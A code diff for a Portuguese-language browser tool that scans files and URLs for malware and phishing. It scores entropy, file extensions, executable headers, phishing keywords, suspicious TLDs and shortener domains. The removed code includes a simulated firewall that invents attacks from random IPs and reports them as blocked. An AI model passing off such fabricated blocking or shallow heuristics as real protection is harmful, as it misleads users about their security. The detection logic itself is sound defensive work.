+    const escapeCell = v => `"${String(v ?? "").replace(/"/g, '""')}"`;
+
+    const rows = list.map(r => [
+        escapeCell(r.name),
+        escapeCell(r.kind),
+        escapeCell(r.riskLabel),
+        escapeCell(r.score),
+        escapeCell(r.size),
+        escapeCell(r.entropy),
+        escapeCell(r.hash),
+        escapeCell(formatDate(r.timestamp))
+    ].join(","));
+
+    return [header.join(","), ...rows].join("\n");
+}
+
+async function analyzeFileBuffer({ name, size, buffer, isSynthetic = false }, config) {
+    const bytes = new Uint8Array(buffer);
+    const hash = await computeSHA512(buffer);
+    const entropy = config.entropy ? calculateShannonEntropy(bytes) : 0;
+    const magic = detectMagicSignature(bytes);
+
+    let score = 0;
+    const reasons = [];
+    let iocs = [];
+
+    const lowerName = name.toLowerCase();
+    const ext = lowerName.includes(".") ? "." + lowerName.split(".").pop() : "";
+
+    if (config.extension) {
+        if (SUSPICIOUS_EXTENSIONS.includes(ext)) {
+            score += 18;
+            reasons.push(`Extensão executável ou de script detectada (${ext}).`);
+        }
+        if (/\.(pdf|doc|docx|jpg|png|txt)\.(exe|scr|bat|vbs|js|ps1)$/i.test(lowerName)) {
+            score += 30;
+            reasons.push("Técnica de dupla extensão detectada (mascaramento de arquivo).");
+        }
+        if (magic.includes("MZ/PE") && ![".exe", ".dll", ".scr", ".sys"].includes(ext)) {
+            score += 28;
+            reasons.push(`Divergência de cabeçalho: assinatura binária MZ/PE em arquivo "${ext || "sem extensão"}".`);
+        }
     }
-    return Date.now().toString(36) + Math.random().toString(36).slice(2);
+
+    if (config.entropy && bytes.length > 64) {
+        if (entropy >= 7.5) {
+            score += 22;
+            reasons.push(`Entropia muito elevada (${entropy} bits/byte) — possível empacotamento ou criptografia.`);
+        } else if (entropy >= 6.8) {
+            score += 10;
+            reasons.push(`Entropia moderada-alta (${entropy} bits/byte).`);
+        }
+    }
+
+    const sampleBytes = bytes.slice(0, 512 * 1024);
+    const textContent = new TextDecoder("utf-8", { fatal: false }).decode(sampleBytes);
+    const lowerText = textContent.toLowerCase();
+
+    if (config.ioc) {
+        for (const rule of HEURISTIC_RULES) {
+            const matched = rule.patterns.filter(p => lowerText.includes(p));
+            if (matched.length > 0) {
+                score += rule.score;
+                reasons.push(`${rule.name} (padrões: ${matched.slice(0, 3).join(", ")}).`);
+            }
+        }
+    }
+
+    if (config.urls) {
+        iocs = extractIOCs(textContent);
+        if (iocs.length > 0) {
+            score += Math.min(15, iocs.length * 3);
+            reasons.push(`${iocs.length} indicador(es) de rede (URL/IP) embutido(s).`);
+        }
+    }
+
+    score = Math.min(100, score);
+    if (reasons.length === 0) {
+        reasons.push("Nenhum indicador heurístico ou assinatura suspeita encontrada.");
+    }
+
+    const risk = classifyRisk(score);
+    return {
+        id: uuid(),
+        kind: isSynthetic ? "AMOSTRA SINTÉTICA" : "ARQUIVO REAL",
+        name,
+        size,
+        hash,
+        entropy,
+        magic,
+        score,
+        riskLevel: risk.level,
+        riskLabel: risk.label,
+        reasons,
+        iocs,
+        timestamp: Date.now()
+    };
 }
 
-function log(message, type="INFO"){
-    const now = new Date().toLocaleTimeString("pt-BR");
+async function analyzeURLStatic(parsedUrl) {
+    const fullStr = parsedUrl.href;
+    const encoder = new TextEncoder();
+    const hash = await computeSHA512(encoder.encode(fullStr).buffer);
+
+    let score = 0;
+    const reasons = [];
+    const host = parsedUrl.hostname.toLowerCase();
+
+    if (parsedUrl.protocol === "http:") {
+        score += 18;
+        reasons.push("Conexão sem criptografia TLS (HTTP puro).");
+    }
+
+    if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(host)) {
+        score += 32;
+        reasons.push("Host utiliza endereço IP direto em vez de domínio registrado.");
+    }
+
+    if (host.includes("xn--")) {
+        score += 28;
+        reasons.push("Domínio internacionalizado em Punycode (risco de ataque homográfico).");
+    }
+
+    if (parsedUrl.username || fullStr.includes("@")) {
+        score += 30;
+        reasons.push("Presença de '@' na URL (técnica clássica de ofuscação de destino).");
+    }
+
+    if (SUSPICIOUS_TLDS.some(tld => host.endsWith(tld))) {
+        score += 20;
+        reasons.push("TLD frequentemente associado a campanhas descartáveis de phishing.");
+    }
+
+    const subdomains = host.split(".").length - 2;
+    if (subdomains >= 3) {
+        score += 15;
+        reasons.push(`Excesso de subdomínios encadeados (${subdomains} níveis).`);
+    }
+
+    const phishingKeywords = ["login", "verify", "secure", "account", "update", "bank", "pix", "senha", "auth"];
+    const foundKw = phishingKeywords.filter(k => fullStr.toLowerCase().includes(k));
+    if (foundKw.length >= 2) {
+        score += 20;
+        reasons.push(`Múltiplos termos sensíveis na estrutura da URL (${foundKw.join(", ")}).`);
+    }
+
+    score = Math.min(100, score);
+    if (reasons.length === 0) {
+        reasons.push("Estrutura lexical da URL dentro dos padrões normais.");
+    }
+
+    const risk = classifyRisk(score);
+    return {
+        id: uuid(),
+        kind: "URL (ESTÁTICO)",
+        name: fullStr,
+        size: encoder.encode(fullStr).length,
+        hash,
+        entropy: calculateShannonEntropy(encoder.encode(fullStr)),
+        magic: `Protocolo ${parsedUrl.protocol.replace(":", "").toUpperCase()}`,
+        score,
+        riskLevel: risk.level,
+        riskLabel: risk.label,
+        reasons,
+        iocs: [host],
+        timestamp: Date.now()
+    };
+}
+
+/* =========================================================
+   3. GERENCIAMENTO DE ESTADO & PERSISTÊNCIA SEGURA
+========================================================= */
+const STORAGE_KEY = "neonav-pro-ultra-v2-results";
+let fileQueue = [];
+let resultsData = [];
+let isScanning = false;
+
+function addLog(message, type = "info") {
+    const logBox = $("log");
     const line = document.createElement("div");
     line.className = "log-line";
-    line.innerHTML = `<span class="log-time">[${escapeHTML(type)} ${now}]</span> ${escapeHTML(message)}`;
+    const time = new Date().toLocaleTimeString("pt-BR");
+    const cls = type === "warn" ? "log-warn" : type === "err" ? "log-err" : "log-time";
+    line.innerHTML = `<span class="${cls}">[${escapeHTML(time)}]</span> ${escapeHTML(message)}`;
     logBox.prepend(line);
 }
 
-function toast(message){
-    status.textContent = "● " + message;
-    setTimeout(() => { status.textContent = "● SISTEMA PRONTO"; }, 2500);
-}
-
-async function sha512(buffer){
-    if(!window.crypto || !window.crypto.subtle){
-        throw new Error("SHA-512 indisponível neste contexto do navegador.");
-    }
-    const hashBuffer = await window.crypto.subtle.digest("SHA-512", buffer);
-    const bytes = new Uint8Array(hashBuffer);
-    return Array.from(bytes).map(b => b.toString(16).padStart(2,"0")).join("");
-}
-
-function calculateByteEntropy(bytes){
-    if(!bytes.length) return 0;
-    const frequency = new Array(256).fill(0);
-    for(const byte of bytes) frequency[byte]++;
-    let entropy = 0;
-    for(const count of frequency){
-        if(count === 0) continue;
-        const probability = count / bytes.length;
-        entropy -= probability * Math.log2(probability);
-    }
-    return entropy;
-}
-
-async function readTextSafely(file){
-    try { return await file.text(); } catch { return ""; }
-}
-
-function detectIOCs(text){
-    const found = [];
-    const patterns = [
-        { type:"URL", regex:/https?:\/\/[^\s"'<>]+/gi },
-        { type:"IPv4", regex:/\b(?:\d{1,3}\.){3}\d{1,3}\b/g },
-        { type:"Email", regex:/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi },
-        { type:"Domain", regex:/\b[a-z0-9.-]+\.(?:com|net|org|io|ru|cn|xyz|top|online|site|onion)\b/gi }
-    ];
-    for(const item of patterns){
-        const matches = text.match(item.regex) || [];
-        for(const match of matches){
-            if(!found.some(x => x.value.toLowerCase() === match.toLowerCase())){
-                found.push({ type:item.type, value:match });
-            }
-        }
-    }
-    return found.slice(0,50);
-}
-
-function suspiciousURLs(iocs){
-    const suspiciousDomains = ["bit.ly", "tinyurl.com", "t.co", "goo.gl", "cutt.ly", "is.gd", "rb.gy", "ow.ly"];
-    return iocs.filter(ioc => {
-        if(ioc.type !== "URL") return false;
-        const value = ioc.value.toLowerCase();
-        return suspiciousDomains.some(domain => value.includes(domain)) || value.includes(".onion");
-    });
-}
-
-function runRules(text){
-    const lower = text.toLowerCase();
-    const detections = [];
-    let score = 0;
-    for(const rule of RULES){
-        const matched = [];
-        for(const pattern of rule.patterns){
-            if(lower.includes(pattern.toLowerCase())){
-                matched.push(pattern);
-            }
-        }
-        if(matched.length){
-            score += rule.score;
-            detections.push({ rule:rule.name, score:rule.score, patterns:matched });
-        }
-    }
-    return { score, detections };
-}
-
-function riskFromScore(score){
-    if(score <= 3) return { level:"low", label:"BAIXO" };
-    if(score <= 8) return { level:"medium", label:"MÉDIO" };
-    if(score <= 15) return { level:"high", label:"ALTO" };
-    return { level:"critical", label:"CRÍTICO" };
-}
-
-async function analyzeFile(file, index, total){
-    const maxMB = Number($("sizeLimit").value);
-    const maxBytes = maxMB * 1024 * 1024;
-
-    log(`Analisando ${file.name}`, "SCAN");
-
-    if(file.size > maxBytes){
-        log(`${file.name}: tamanho excede ${maxMB} MB`, "WARNING");
-        return {
-            id:uuid(), name:file.name, size:file.size, type:file.type || "desconhecido",
-            modified:file.lastModified, timestamp:Date.now(), score:0, risk:"medium",
-            riskLabel:"NÃO ANALISADO", error:`Arquivo excede o limite de ${maxMB} MB.`,
-            hash:"", entropy:0, detections:[], iocs:[], suspiciousURLs:[]
-        };
-    }
-
-    const buffer = await file.arrayBuffer();
-    let hash = "";
-    try { hash = await sha512(buffer); } catch(error) { log("Erro no SHA-512: "+error.message, "ERROR"); }
-
-    const bytes = new Uint8Array(buffer);
-    const entropy = $("cfgEntropy").checked ? calculateByteEntropy(bytes) : 0;
-    const text = await readTextSafely(file);
-    const rules = runRules(text);
-    let score = rules.score;
-    const reasons = [];
-
-    for(const detection of rules.detections){
-        reasons.push(`${detection.rule}: ${detection.patterns.join(", ")}`);
-    }
-
-    if($("cfgExtension").checked){
-        const lowerName = file.name.toLowerCase();
-        const extension = "." + (lowerName.includes(".") ? lowerName.split(".").pop() : "");
-        if(SUSPICIOUS_EXTENSIONS.includes(extension)){
-            score += 3;
-            reasons.push(`Extensão potencialmente executável/sensível: ${extension}`);
-        }
-    }
-
-    if($("cfgEntropy").checked && entropy >= 7.2){
-        score += 5;
-        reasons.push(`Entropia de bytes elevada: ${entropy.toFixed(2)} bits`);
-    }
-
-    let iocs = [];
-    if($("cfgIoc").checked){
-        iocs = detectIOCs(text);
-        if(iocs.length) reasons.push(`${iocs.length} IOC(s) detectado(s)`);
-    }
-
-    let suspicious = [];
-    if($("cfgUrls").checked){
-        suspicious = suspiciousURLs(iocs);
-        if(suspicious.length){
-            score += 5;
-            reasons.push(`${suspicious.length} URL(s) potencialmente suspeita(s)`);
-        }
-    }
-
-    score = Math.min(score, 100);
-    const risk = riskFromScore(score);
-
-    return {
-        id:uuid(), name:file.name, size:file.size, type:file.type || "desconhecido",
-        modified:file.lastModified, timestamp:Date.now(), score, risk:risk.level,
-        riskLabel:risk.label, hash, entropy, detections:rules.detections,
-        iocs, suspiciousURLs:suspicious, reasons
-    };
-}
-
-/* =========================================================
-   ANÁLISE DE URL VIA PROXY CORS
-========================================================= */
-async function analyzeURL(targetUrl){
-    if(!targetUrl){
-        toast("Insira uma URL válida");
-        return;
-    }
-    if(!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")){
-        targetUrl = "https://" + targetUrl;
-    }
-
-    log(`Iniciando análise da URL: ${targetUrl}`, "URL");
-    toast("Baixando conteúdo da URL...");
-
+function saveState() {
     try {
-        const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}`;
-        const response = await fetch(proxyUrl);
-        if(!response.ok) throw new Error(`Erro HTTP: ${response.status}`);
-
-        const data = await response.json();
-        const htmlContent = data.contents || "";
-
-        if(!htmlContent.trim()){
-            throw new Error("A página retornou conteúdo vazio ou bloqueou o acesso.");
-        }
-
-        const simulatedBlob = new Blob([htmlContent], { type: "text/html" });
-        const simulatedFile = new File([simulatedBlob], targetUrl, {
-            type: "text/html",
-            lastModified: Date.now()
-        });
-
-        const result = await analyzeFile(simulatedFile, 0, 1);
-        result.name = targetUrl;
-        result.type = "Website / URL";
-
-        resultsData.unshift(result);
-        saveHistory();
-        renderResults();
-        updateDashboard();
-
-        toast("Análise de URL concluída!");
-        log(`URL analisada com sucesso: ${targetUrl} (Score: ${result.score})`, "DONE");
-
-    } catch (error) {
-        log(`Erro ao analisar URL: ${error.message}`, "ERROR");
-        toast("Falha ao analisar URL (verifique CORS)");
-    }
-}
-
-$("scanUrlBtn").addEventListener("click", () => {
-    const urlInput = $("urlInput");
-    analyzeURL(urlInput.value.trim());
-    urlInput.value = "";
-});
-
-/* =========================================================
-   PROCESSAR FILA DE ARQUIVOS
-========================================================= */
-async function scanFiles(){
-    if(scanning) return;
-    if(!filesQueue.length){
-        toast("Nenhum arquivo selecionado");
-        return;
-    }
-
-    scanning = true;
-    scanBtn.disabled = true;
-    progressBar.style.width = "0%";
-    progressText.textContent = "Iniciando análise...";
-    resultsData = [];
-
-    for(let i=0; i<filesQueue.length; i++){
-        const file = filesQueue[i];
-        progressText.textContent = `Analisando ${i+1} de ${filesQueue.length}: ${file.name}`;
-        try {
-            const result = await analyzeFile(file, i, filesQueue.length);
-            resultsData.push(result);
-        } catch(error){
-            log(`${file.name}: ${error.message}`, "ERROR");
-            resultsData.push({
-                id:uuid(), name:file.name, size:file.size, type:file.type || "desconhecido",
-                timestamp:Date.now(), score:0, risk:"medium", riskLabel:"ERRO",
-                hash:"", entropy:0, detections:[], iocs:[], suspiciousURLs:[], error:error.message
-            });
-        }
-        progressBar.style.width = (((i+1)/filesQueue.length)*100) + "%";
-    }
-
-    saveHistory();
-    renderResults();
-    updateDashboard();
-    filesQueue = [];
-    scanning = false;
-    scanBtn.disabled = false;
-    progressText.textContent = `Análise concluída: ${resultsData.length} arquivo(s).`;
-    toast("ANÁLISE CONCLUÍDA");
-    log(`${resultsData.length} arquivo(s) analisado(s).`, "DONE");
-}
-
-/* =========================================================
-   RENDER RESULTADOS & DASHBOARD
-========================================================= */
-function renderResults(){
-    const query = searchInput.value.toLowerCase().trim();
-    const filter = riskFilter.value;
-    const sort = sortSelect.value;
-
-    let list = resultsData.filter(item => {
-        const searchable = [
-            item.name, item.hash, item.type, item.riskLabel,
-            ...(item.iocs || []).map(x => x.value)
-        ].join(" ").toLowerCase();
-
-        const matchesSearch = !query || searchable.includes(query);
-        const matchesRisk = filter === "all" || item.risk === filter;
-        return matchesSearch && matchesRisk;
-    });
-
-    if(sort === "score") list.sort((a,b) => b.score - a.score);
-    else if(sort === "name") list.sort((a,b) => a.name.localeCompare(b.name));
-    else if(sort === "size") list.sort((a,b) => b.size - a.size);
-    else list.sort((a,b) => b.timestamp - a.timestamp);
-
-    if(!list.length){
-        resultsBox.innerHTML = `<div class="empty">Nenhum resultado encontrado.</div>`;
-        return;
-    }
-
-    resultsBox.innerHTML = list.map(renderResult).join("");
-}
-
-function renderResult(item){
-    const reasons = (item.reasons || []).map(r => `<li>${escapeHTML(r)}</li>`).join("");
-    const iocs = (item.iocs || []).map(i => `<span class="ioc">${escapeHTML(i.type)}: ${escapeHTML(i.value)}</span>`).join("");
-    const detectionCount = (item.detections || []).length;
-
-    return `
-    <article class="result ${item.risk}">
-    <div class="result-head">
-    <div>
-    <div class="filename">${escapeHTML(item.name)}</div>
-    <div class="meta">${escapeHTML(item.type)} • ${formatBytes(item.size)} • ${formatDate(item.timestamp)}</div>
-    </div>
-    <div>
-    <div class="badge ${item.risk}">${escapeHTML(item.riskLabel)}</div>
-    <div class="score">${item.score}</div>
-    </div>
-    </div>
-
-    <div class="result-grid">
-    <div class="info"><small>SHA-512</small><div class="hash" title="${escapeHTML(item.hash)}">${escapeHTML(item.hash || "Indisponível")}</div></div>
-    <div class="info"><small>Entropia</small><strong>${Number(item.entropy || 0).toFixed(2)}</strong></div>
-    <div class="info"><small>Regras</small><strong>${detectionCount}</strong></div>
-    <div class="info"><small>IOCs</small><strong>${(item.iocs || []).length}</strong></div>
-    </div>
-
-    ${item.error ? `<div style="margin-top:12px;color:var(--red)">⚠️ ${escapeHTML(item.error)}</div>` : ''}
-
-    ${reasons ? `<div class="reasons"><strong>🧠 Indicadores detectados</strong><ul>${reasons}</ul></div>` : `<div class="reasons"><span style="color:var(--green)">✓ Nenhum indicador heurístico relevante encontrado.</span></div>`}
-
-    ${iocs ? `<div class="reasons"><strong>🌐 IOCs</strong><div>${iocs}</div></div>` : ''}
-
-    <div class="actions">
-    <button class="btn" data-copy="${escapeHTML(item.hash)}">📋 Copiar SHA-512</button>
-    <button class="btn" data-export="${escapeHTML(item.id)}">📄 Exportar</button>
-    </div>
-    </article>
-    `;
-}
-
-function updateDashboard(){
-    const total = resultsData.length;
-    const low = resultsData.filter(x => x.risk === "low").length;
-    const medium = resultsData.filter(x => x.risk === "medium").length;
-    const high = resultsData.filter(x => x.risk === "high").length;
-    const critical = resultsData.filter(x => x.risk === "critical").length;
-
-    $("totalFiles").textContent = total;
-    $("lowCount").textContent = low;
-    $("mediumCount").textContent = medium;
-    $("highCount").textContent = high;
-    $("criticalCount").textContent = critical;
-
-    const average = total ? resultsData.reduce((sum, item) => sum + item.score, 0) / total : 0;
-    $("averageScore").textContent = average.toFixed(1);
-
-    const percentages = {
-        low: total ? low/total*100 : 0,
-        medium: total ? medium/total*100 : 0,
-        high: total ? high/total*100 : 0,
-        critical: total ? critical/total*100 : 0
-    };
-
-    for(const key of Object.keys(percentages)){
-        $(`${key}Percent`).textContent = percentages[key].toFixed(0) + "%";
-        $(`${key}Fill`).style.width = percentages[key] + "%";
-    }
-}
-
-/* =========================================================
-   MÓDULO DE BLOQUEIO DE ATAQUES (FIREWALL / IPS)
-========================================================= */
-const ATTACK_PROFILES = {
-    ddos: {
-        name: 'Ataque DDoS Volumétrico / UDP Flood',
-        details: 'Fluxo massivo de pacotes inválidos mitigado pela camada de borda BGP.'
-    },
-    xss: {
-        name: 'Tentativa de Cross-Site Scripting (XSS)',
-        details: 'Injeção de payload malicioso <script> bloqueada no WAF.'
-    },
-    sql: {
-        name: 'Tentativa de SQL Injection (Boolean-based)',
-        details: 'Tentativa de extração de tabela de usuários neutralizada.'
-    },
-    brute: {
-        name: 'Ataque de Força Bruta em Credenciais',
-        details: 'IP banido após exceder limite de 5 tentativas de autenticação.'
-    }
-};
-
-const RANDOM_IPS = [
-    '185.220.101.7', '45.154.255.120', '194.26.29.99', '103.152.68.21',
-    '198.51.100.42', '203.0.113.195', '192.0.2.14', '178.62.204.11'
-];
-
-function triggerAttack(type = null){
-    if(!$("ipsToggle").checked){
-        toast("O Firewall IPS está desativado!");
-        log("Tentativa de ataque ignorada pois o IPS está desligado.", "WARNING");
-        return;
-    }
-
-    const types = ['ddos', 'xss', 'sql', 'brute'];
-    const attackType = type || types[Math.floor(Math.random() * types.length)];
-    const profile = ATTACK_PROFILES[attackType];
-    const randomIp = RANDOM_IPS[Math.floor(Math.random() * RANDOM_IPS.length)];
-
-    firewallStats[attackType]++;
-    
-    const newEvent = {
-        id: uuid(),
-        type: attackType,
-        name: profile.name,
-        ip: randomIp,
-        timestamp: Date.now(),
-        details: profile.details
-    };
-
-    firewallEvents.unshift(newEvent);
-    if(firewallEvents.length > 100) firewallEvents.pop();
-
-    saveFirewallData();
-    renderFirewallStats();
-    renderFirewallFeed();
-    
-    toast(`Ataque ${attackType.toUpperCase()} bloqueado com sucesso!`);
-    log(`Firewall IPS interceptou ${profile.name} originado de ${randomIp}`, "FIREWALL");
-}
-
-function renderFirewallStats(){
-    $("countDdos").textContent = firewallStats.ddos;
-    $("countXss").textContent = firewallStats.xss;
-    $("countSql").textContent = firewallStats.sql;
-    $("countBrute").textContent = firewallStats.brute;
-}
-
-function renderFirewallFeed(){
-    const feedBox = $("attackFeed");
-    if(!firewallEvents.length){
-        feedBox.innerHTML = `<div class="empty">Nenhum ataque interceptado recentemente. O Firewall está operando normalmente.</div>`;
-        return;
-    }
-
-    feedBox.innerHTML = firewallEvents.map(evt => {
-        return `
-        <div class="attack-item">
-            <div class="attack-info">
-                <div>
-                    <span class="attack-type-badge ${evt.type}">${escapeHTML(evt.type.toUpperCase())}</span>
-                    <span class="attack-ip">${escapeHTML(evt.ip)}</span>
-                </div>
-                <div style="font-weight: bold; font-size: 14px; margin-top: 4px;">${escapeHTML(evt.name)}</div>
-                <div class="attack-details">${escapeHTML(evt.details)} • ${formatDate(evt.timestamp)}</div>
-            </div>
-            <div class="attack-status">
-                <span class="blocked-badge">🛡️ BLOQUEADO</span>
-            </div>
-        </div>
-        `;
-    }).join("");
-}
-
-function saveFirewallData(){
-    try {
-        localStorage.setItem(FIREWALL_STORAGE_KEY, JSON.stringify({ stats: firewallStats, events: firewallEvents }));
-    } catch(e) { console.error(e); }
-}
-
-function loadFirewallData(){
-    try {
-        const data = JSON.parse(localStorage.getItem(FIREWALL_STORAGE_KEY) || "null");
-        if(data){
-            if(data.stats) firewallStats = data.stats;
-            if(Array.isArray(data.events)) firewallEvents = data.events;
-        }
-    } catch(e) { console.error(e); }
-}
-
-$("simulateAttackBtn").addEventListener("click", () => triggerAttack());
-$("clearAttacksBtn").addEventListener("click", () => {
-    if(!confirm("Limpar histórico de eventos de firewall?")) return;
-    firewallEvents = [];
-    firewallStats = { ddos: 0, xss: 0, sql: 0, brute: 0 };
-    saveFirewallData();
-    renderFirewallStats();
-    renderFirewallFeed();
-    log("Histórico de ataques limpo.", "FIREWALL");
-    toast("Histórico limpo");
-});
-
-// Simulação periódica de tráfego de ataques em segundo plano (se IPS ligado)
-setInterval(() => {
-    if(document.visibilityState === "visible" && $("ipsToggle").checked){
-        if(Math.random() > 0.65){
-            triggerAttack();
-        }
-    }
-}, 8000);
-
-/* =========================================================
-   HISTÓRICO DE ARQUIVOS & EXPORTAÇÃO
-========================================================= */
-function saveHistory(){
-    try {
-        const old = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-        const merged = [...resultsData, ...old].slice(0, 500);
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(merged));
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(resultsData.slice(0, 100)));
     } catch {
-        log("Não foi possível salvar histórico.", "WARNING");
+        addLog("Aviso: limite de armazenamento local atingido.", "warn");
     }
 }
 
-function loadHistory(){
+function loadState() {
     try {
-        const history = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-        if(Array.isArray(history) && history.length){
-            resultsData = history;
-            renderResults();
-            updateDashboard();
-            log(`${history.length} registro(s) carregado(s).`, "HISTORY");
+        const raw = localStorage.getItem(STORAGE_KEY);
+        if (!raw) return;
+        const parsed = JSON.parse(raw);
+        if (Array.isArray(parsed)) {
+            resultsData = parsed.filter(item => item && typeof item.id === "string" && typeof item.score === "number");
         }
-    } catch(e) { console.error(e); }
+    } catch {
+        localStorage.removeItem(STORAGE_KEY);
+    }
 }
 
-function downloadFile(content, filename, type){
-    const blob = new Blob([content], { type });
+function getEngineConfig() {
+    return {
+        urls: $("cfgUrls").checked,
+        entropy: $("cfgEntropy").checked,
+        extension: $("cfgExtension").checked,
+        ioc: $("cfgIoc").checked,
+        sizeLimitMB: Number($("sizeLimit").value) || 10
+    };
+}
+
+/* =========================================================
+   4. RENDERIZAÇÃO & CONTROLES DO SCANNER
+========================================================= */
+function updateQueueUI() {
+    $("queueCount").textContent = String(fileQueue.length);
+}
+
+function updateMetricsUI() {
+    const total = resultsData.length;
+    const counts = { low: 0, medium: 0, high: 0, critical: 0 };
+    let scoreSum = 0;
+
+    for (const r of resultsData) {
+        if (counts[r.riskLevel] !== undefined) counts[r.riskLevel]++;
+        scoreSum += r.score;
+    }
+
+    $("totalFiles").textContent = String(total);
+    $("lowCount").textContent = String(counts.low);
+    $("mediumCount").textContent = String(counts.medium);
+    $("highCount").textContent = String(counts.high);
+    $("criticalCount").textContent = String(counts.critical);
+
+    const avg = total ? Math.round(scoreSum / total) : 0;
+    const avgEl = $("averageScore");
+    avgEl.textContent = String(avg);
+    avgEl.className = "metric-value " + (avg >= 75 ? "red" : avg >= 50 ? "orange" : avg >= 25 ? "yellow" : "green");
+
+    const pct = n => total ? Math.round((n / total) * 100) : 0;
+    ["low", "medium", "high", "critical"].forEach(lvl => {
+        const p = pct(counts[lvl]);
+        $(`${lvl}Percent`).textContent = `${p}%`;
+        $(`${lvl}Fill`).style.width = `${p}%`;
+    });
+}
+
+function renderResults() {
+    const box = $("results");
+    const list = sortReports(
+        filterReports(resultsData, {
+            query: $("searchInput").value,
+            risk: $("riskFilter").value
+        }),
+        $("sortSelect").value
+    );
+
+    if (list.length === 0) {
+        box.innerHTML = `<div class="empty">Nenhum laudo corresponde aos filtros atuais.</div>`;
+        return;
+    }
+
+    box.innerHTML = list.map(item => `
+        <article class="result ${escapeHTML(item.riskLevel)}">
+            <div class="result-head">
+                <div>
+                    <div class="filename">
+                        ${escapeHTML(item.name)}
+                        <span class="source-tag">${escapeHTML(item.kind)}</span>
+                    </div>
+                    <div class="meta">${escapeHTML(formatDate(item.timestamp))} • ${escapeHTML(item.magic)}</div>
+                </div>
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <span class="badge ${escapeHTML(item.riskLevel)}">${escapeHTML(item.riskLabel)}</span>
+                    <span class="score ${item.riskLevel === "critical" ? "red" : item.riskLevel === "high" ? "orange" : item.riskLevel === "medium" ? "yellow" : "green"}">${item.score}/100</span>
+                </div>
+            </div>
+
+            <div class="result-grid">
+                <div class="info"><small>Tamanho</small><strong>${escapeHTML(formatBytes(item.size))}</strong></div>
+                <div class="info"><small>Entropia Shannon</small><strong>${item.entropy} bits/B</strong></div>
+                <div class="info"><small>IOCs Extraídos</small><strong>${item.iocs.length}</strong></div>
+                <div class="info"><small>SHA-512</small><div class="hash">${escapeHTML(item.hash)}</div></div>
+            </div>
+
+            <div class="reasons">
+                <strong style="font-size:12px; color:var(--muted);">Diagnóstico Técnico:</strong>
+                <ul>
+                    ${item.reasons.map(r => `<li>${escapeHTML(r)}</li>`).join("")}
+                </ul>
+            </div>
+
+            ${item.iocs.length ? `
+                <div style="margin-top:10px;">
+                    ${item.iocs.map(ioc => `<span class="ioc">${escapeHTML(ioc)}</span>`).join("")}
+                </div>
+            ` : ""}
+        </article>
+    `).join("");
+}
+
+function enqueueFiles(fileList, isSynthetic = false) {
+    const cfg = getEngineConfig();
+    let accepted = 0;
+
+    for (const file of fileList) {
+        const check = validateFileInput(file, cfg.sizeLimitMB);
+        if (!check.valid) {
+            addLog(`Rejeitado "${file?.name || "arquivo"}": ${check.error}`, "err");
+            continue;
+        }
+        fileQueue.push({ file, isSynthetic });
+        accepted++;
+    }
+
+    updateQueueUI();
+    if (accepted > 0) {
+        $("progressText").textContent = `${fileQueue.length} item(ns) pronto(s) na fila para análise.`;
+        addLog(`${accepted} arquivo(s) validado(s) e enfileirado(s).`);
+    }
+}
+
+async function processQueue() {
+    if (isScanning) return;
+    if (fileQueue.length === 0) {
+        addLog("A fila de arquivos está vazia.", "warn");
+        return;
+    }
+
+    isScanning = true;
+    $("scanBtn").disabled = true;
+    $("status").textContent = "● ANALISANDO...";
+    const cfg = getEngineConfig();
+    const total = fileQueue.length;
+
+    for (let i = 0; i < total; i++) {
+        const item = fileQueue[i];
+        const pct = Math.round(((i + 1) / total) * 100);
+        $("progressBar").style.width = `${pct}%`;
+        $("progressText").textContent = `Analisando (${i + 1}/${total}): ${item.file.name}`;
+
+        try {
+            const buffer = await item.file.arrayBuffer();
+            const report = await analyzeFileBuffer({
+                name: item.file.name,
+                size: item.file.size,
+                buffer,
+                isSynthetic: item.isSynthetic
+            }, cfg);
+
+            resultsData.unshift(report);
+            addLog(`Concluído: ${report.name} [Score ${report.score} - ${report.riskLabel}]`);
+        } catch (err) {
+            addLog(`Erro ao ler "${item.file.name}": ${err.message}`, "err");
+        }
+    }
+
+    fileQueue = [];
+    updateQueueUI();
+    saveState();
+    updateMetricsUI();
+    renderResults();
+
+    $("progressText").textContent = `Análise concluída (${total} item(ns) processado(s)).`;
+    $("status").textContent = "● SISTEMA PRONTO";
+    $("scanBtn").disabled = false;
+    isScanning = false;
+}
+
+/* =========================================================
+   5. EXPORTAÇÃO DE RELATÓRIOS
+========================================================= */
+function downloadBlob(content, filename, mime) {
+    const blob = new Blob([content], { type: mime });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
@@ -1919,159 +1563,413 @@ function downloadFile(content, filename, type){
     document.body.appendChild(a);
     a.click();
     a.remove();
-    setTimeout(() => URL.revokeObjectURL(url), 1000);
+    URL.revokeObjectURL(url);
 }
 
-function exportJSON(){
-    if(!resultsData.length){ toast("Nenhum resultado"); return; }
-    downloadFile(JSON.stringify(resultsData, null, 2), "neonav-relatorio.json", "application/json");
-    log("Relatório JSON exportado.", "EXPORT");
+$("jsonBtn").addEventListener("click", () => {
+    if (!resultsData.length) return addLog("Sem dados para exportar.", "warn");
+    downloadBlob(buildJSONExport(resultsData), `neonav-laudos-${Date.now()}.json`, "application/json");
+    addLog("Relatório JSON exportado.");
+});
+
+$("csvBtn").addEventListener("click", () => {
+    if (!resultsData.length) return addLog("Sem dados para exportar.", "warn");
+    downloadBlob(buildCSVExport(resultsData), `neonav-laudos-${Date.now()}.csv`, "text/csv;charset=utf-8");
+    addLog("Relatório CSV exportado.");
+});
+
+$("htmlBtn").addEventListener("click", () => {
+    if (!resultsData.length) return addLog("Sem dados para exportar.", "warn");
+    const html = `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><title>Laudo NeonAV 2.0</title>
+    <style>body{font-family:Arial,sans-serif;background:#07130d;color:#eafff2;padding:24px}table{width:100%;border-collapse:collapse}th,td{border:1px solid #123b27;padding:10px;text-align:left;font-size:13px}th{background:#0b1c13;color:#00ff88}</style>
